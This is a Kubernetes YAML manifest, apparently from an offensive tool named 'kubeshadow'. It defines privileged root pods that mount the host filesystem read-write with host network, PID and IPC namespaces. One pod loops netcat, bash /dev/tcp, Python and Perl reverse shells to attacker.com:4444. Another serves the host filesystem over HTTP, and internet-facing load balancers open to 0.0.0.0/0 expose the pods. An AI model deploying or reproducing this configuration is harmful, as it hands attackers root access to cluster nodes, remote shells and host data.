apiVersion: v1
kind: Pod
metadata:
  name: loadbalancer-exploit-pod
  namespace: default
  labels:
    app: loadbalancer-exploit
    kubeshadow.exploit: "loadbalancer"
    kubeshadow.privileged: "true"
  annotations:
    kubeshadow.exploit: "loadbalancer"
    kubeshadow.privileged: "true"
    kubeshadow.external: "true"
    kubeshadow.internet: "true"
    kubeshadow.host-access: "true"
    kubeshadow.reverse-shell: "true"
spec:
  containers:
  - name: exploit-container
    image: alpine:latest
    command: ["/bin/sh"]
    args: 
    - "-c"
    - |
      # Load balancer exploitation payload
      echo "Load Balancer Exploit Pod Started"
      echo "Host filesystem access enabled"
      echo "Reverse shell capability enabled"
      
      # Install network tools
      apk add --no-cache netcat-openbsd curl wget
      
      # Start reverse shell (modify LHOST and LPORT as needed)
      while true; do
        echo "Attempting reverse shell connection..."
        nc -e /bin/sh LHOST LPORT 2>/dev/null || true
        sleep 30
      done
    ports:
    - containerPort: 8080
      protocol: TCP
    - containerPort: 4444
      protocol: TCP
    securityContext:
      # Privileged security context for host access
      runAsUser: 0
      runAsGroup: 0
      privileged: true
      allowPrivilegeEscalation: true
      capabilities:
        add: ["ALL"]
    volumeMounts:
    # Host filesystem access
    - name: host-root
      mountPath: /host
      readOnly: false
    - name: host-var
      mountPath: /host-var
      readOnly: false
    - name: host-etc
      mountPath: /host-etc
      readOnly: false
    - name: host-opt
      mountPath: /host-opt
      readOnly: false
    - name: host-home
      mountPath: /host-home
      readOnly: false
    - name: host-tmp
      mountPath: /host-tmp
      readOnly: false
    env:
    - name: HOST_ACCESS
      value: "true"
    - name: REVERSE_SHELL
      value: "true"
    - name: LHOST
      value: "attacker.com"
    - name: LPORT
      value: "4444"
    - name: EXPLOIT_MODE
      value: "loadbalancer"
    resources:
      requests:
        memory: "64Mi"
        cpu: "50m"
      limits:
        memory: "128Mi"
        cpu: "100m"
  volumes:
  # Host filesystem volumes
  - name: host-root
    hostPath:
      path: /
      type: Directory
  - name: host-var
    hostPath:
      path: /var
      type: Directory
  - name: host-etc
    hostPath:
      path: /etc
      type: Directory
  - name: host-opt
    hostPath:
      path: /opt
      type: Directory
  - name: host-home
    hostPath:
      path: /home
      type: Directory
  - name: host-tmp
    hostPath:
      path: /tmp
      type: Directory
  # Host access capabilities
  hostNetwork: true
  hostPID: true
  hostIPC: true
---
apiVersion: v1
kind: Service
metadata:
  name: loadbalancer-exploit-service
  namespace: default
  labels:
    kubeshadow.exploit: "loadbalancer"
    kubeshadow.target: "loadbalancer-exploit-pod"
  annotations:
    kubeshadow.exploit: "loadbalancer"
    kubeshadow.target: "loadbalancer-exploit-pod"
    kubeshadow.port: "8080"
    kubeshadow.external: "true"
    kubeshadow.internet: "true"
    kubeshadow.host-access: "true"
    kubeshadow.reverse-shell: "true"
    # Cloud provider specific annotations for load balancer configuration
    service.beta.kubernetes.io/aws-load-balancer-type: "nlb"
    service.beta.kubernetes.io/aws-load-balancer-scheme: "internet-facing"
    service.beta.kubernetes.io/aws-load-balancer-cross-zone-load-balancing-enabled: "true"
    service.beta.kubernetes.io/aws-load-balancer-connection-draining-enabled: "true"
    service.beta.kubernetes.io/aws-load-balancer-connection-draining-timeout: "60"
    # GCP specific annotations
    cloud.google.com/load-balancer-type: "External"
    cloud.google.com/neg: '{"ingress": true}'
    # Azure specific annotations
    service.beta.kubernetes.io/azure-load-balancer-internal: "false"
    service.beta.kubernetes.io/azure-load-balancer-resource-group: "kubeshadow-rg"
spec:
  type: LoadBalancer
  selector:
    app: loadbalancer-exploit
  ports:
  - name: http
    port: 80
    targetPort: 8080
    protocol: TCP
  - name: reverse-shell
    port: 4444
    targetPort: 4444
    protocol: TCP
  - name: admin
    port: 8080
    targetPort: 8080
    protocol: TCP
  externalTrafficPolicy: Cluster
  loadBalancerSourceRanges:
  - 0.0.0.0/0  # Allow access from anywhere (dangerous!)
---
apiVersion: v1
kind: Pod
metadata:
  name: reverse-shell-pod
  namespace: default
  labels:
    app: reverse-shell-exploit
    kubeshadow.exploit: "reverse-shell"
    kubeshadow.privileged: "true"
  annotations:
    kubeshadow.exploit: "reverse-shell"
    kubeshadow.privileged: "true"
    kubeshadow.external: "true"
    kubeshadow.reverse-shell: "true"
    kubeshadow.lhost: "attacker.com"
    kubeshadow.lport: "4444"
spec:
  containers:
  - name: reverse-shell-container
    image: alpine:latest
    command: ["/bin/sh"]
    args:
    - "-c"
    - |
      # Reverse shell payload
      echo "Reverse Shell Exploit Pod Started"
      
      # Install network tools
      apk add --no-cache netcat-openbsd curl wget bash
      
      # Multiple reverse shell attempts
      while true; do
        echo "Attempting reverse shell to attacker.com:4444"
        
        # Method 1: Basic netcat reverse shell
        nc -e /bin/sh attacker.com 4444 2>/dev/null || true
        
        # Method 2: Bash reverse shell
        bash -i >& /dev/tcp/attacker.com/4444 0>&1 2>/dev/null || true
        
        # Method 3: Python reverse shell
        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 2>/dev/null || true
        
        # Method 4: Perl reverse shell
        perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' 2>/dev/null || true
        
        sleep 30
      done
    ports:
    - containerPort: 4444
      protocol: TCP
    securityContext:
      # Privileged security context
      runAsUser: 0
      runAsGroup: 0
      privileged: true
      allowPrivilegeEscalation: true
      capabilities:
        add: ["ALL"]
    volumeMounts:
    # Host filesystem access
    - name: host-root
      mountPath: /host
      readOnly: false
    env:
    - name: REVERSE_SHELL
      value: "true"
    - name: LHOST
      value: "attacker.com"
    - name: LPORT
      value: "4444"
    resources:
      requests:
        memory: "64Mi"
        cpu: "50m"
      limits:
        memory: "128Mi"
        cpu: "100m"
  volumes:
  # Host filesystem access
  - name: host-root
    hostPath:
      path: /
      type: Directory
  # Host access capabilities
  hostNetwork: true
  hostPID: true
  hostIPC: true
---
apiVersion: v1
kind: Service
metadata:
  name: reverse-shell-service
  namespace: default
  labels:
    kubeshadow.exploit: "loadbalancer"
    kubeshadow.target: "reverse-shell-pod"
  annotations:
    kubeshadow.exploit: "loadbalancer"
    kubeshadow.target: "reverse-shell-pod"
    kubeshadow.port: "4444"
    kubeshadow.external: "true"
    kubeshadow.internet: "true"
    kubeshadow.reverse-shell: "true"
    # Cloud provider specific annotations
    service.beta.kubernetes.io/aws-load-balancer-type: "nlb"
    service.beta.kubernetes.io/aws-load-balancer-scheme: "internet-facing"
    cloud.google.com/load-balancer-type: "External"
    service.beta.kubernetes.io/azure-load-balancer-internal: "false"
spec:
  type: LoadBalancer
  selector:
    app: reverse-shell-exploit
  ports:
  - name: reverse-shell
    port: 4444
    targetPort: 4444
    protocol: TCP
  externalTrafficPolicy: Cluster
  loadBalancerSourceRanges:
  - 0.0.0.0/0  # Allow access from anywhere (dangerous!)
---
apiVersion: v1
kind: Pod
metadata:
  name: host-access-pod
  namespace: default
  labels:
    app: host-access-exploit
    kubeshadow.exploit: "host-access"
    kubeshadow.privileged: "true"
  annotations:
    kubeshadow.exploit: "host-access"
    kubeshadow.privileged: "true"
    kubeshadow.external: "true"
    kubeshadow.host-access: "true"
spec:
  containers:
  - name: host-access-container
    image: alpine:latest
    command: ["/bin/sh"]
    args:
    - "-c"
    - |
      # Host access exploitation payload
      echo "Host Access Exploit Pod Started"
      echo "Full host filesystem access enabled"
      
      # Install tools
      apk add --no-cache netcat-openbsd curl wget bash python3
      
      # Start web server for remote access
      python3 -m http.server 8080 &
      
      # Keep container running
      while true; do
        echo "Host access pod running..."
        echo "Access host filesystem at /host/"
        echo "Web server running on port 8080"
        sleep 30
      done
    ports:
    - containerPort: 8080
      protocol: TCP
    securityContext:
      # Privileged security context for host access
      runAsUser: 0
      runAsGroup: 0
      privileged: true
      allowPrivilegeEscalation: true
      capabilities:
        add: ["ALL"]
    volumeMounts:
    # Complete host filesystem access
    - name: host-root
      mountPath: /host
      readOnly: false
    - name: host-var
      mountPath: /host-var
      readOnly: false
    - name: host-etc
      mountPath: /host-etc
      readOnly: false
    - name: host-opt
      mountPath: /host-opt
      readOnly: false
    - name: host-home
      mountPath: /host-home
      readOnly: false
    - name: host-tmp
      mountPath: /host-tmp
      readOnly: false
    - name: host-usr
      mountPath: /host-usr
      readOnly: false
    - name: host-sbin
      mountPath: /host-sbin
      readOnly: false
    - name: host-bin
      mountPath: /host-bin
      readOnly: false
    env:
    - name: HOST_ACCESS
      value: "true"
    - name: EXPLOIT_MODE
      value: "host-filesystem"
    resources:
      requests:
        memory: "64Mi"
        cpu: "50m"
      limits:
        memory: "128Mi"
        cpu: "100m"
  volumes:
  # Complete host filesystem access
  - name: host-root
    hostPath:
      path: /
      type: Directory
  - name: host-var
    hostPath:
      path: /var
      type: Directory
  - name: host-etc
    hostPath:
      path: /etc
      type: Directory
  - name: host-opt
    hostPath:
      path: /opt
      type: Directory
  - name: host-home
    hostPath:
      path: /home
      type: Directory
  - name: host-tmp
    hostPath:
      path: /tmp
      type: Directory
  - name: host-usr
    hostPath:
      path: /usr
      type: Directory
  - name: host-sbin
    hostPath:
      path: /sbin
      type: Directory
  - name: host-bin
    hostPath:
      path: /bin
      type: Directory
  # Host access capabilities
  hostNetwork: true
  hostPID: true
  hostIPC: true
---
apiVersion: v1
kind: Service
metadata:
  name: host-access-service
  namespace: default
  labels:
    kubeshadow.exploit: "loadbalancer"
    kubeshadow.target: "host-access-pod"
  annotations:
    kubeshadow.exploit: "loadbalancer"
    kubeshadow.target: "host-access-pod"
    kubeshadow.port: "8080"
    kubeshadow.external: "true"
    kubeshadow.internet: "true"
    kubeshadow.host-access: "true"
    # Cloud provider specific annotations
    service.beta.kubernetes.io/aws-load-balancer-type: "nlb"
    service.beta.kubernetes.io/aws-load-balancer-scheme: "internet-facing"
    cloud.google.com/load-balancer-type: "External"
    service.beta.kubernetes.io/azure-load-balancer-internal: "false"
spec:
  type: LoadBalancer
  selector:
    app: host-access-exploit
  ports:
  - name: http
    port: 80
    targetPort: 8080
    protocol: TCP
  - name: admin
    port: 8080
    targetPort: 8080
    protocol: TCP
  externalTrafficPolicy: Cluster
  loadBalancerSourceRanges:
  - 0.0.0.0/0  # Allow access from anywhere (dangerous!)
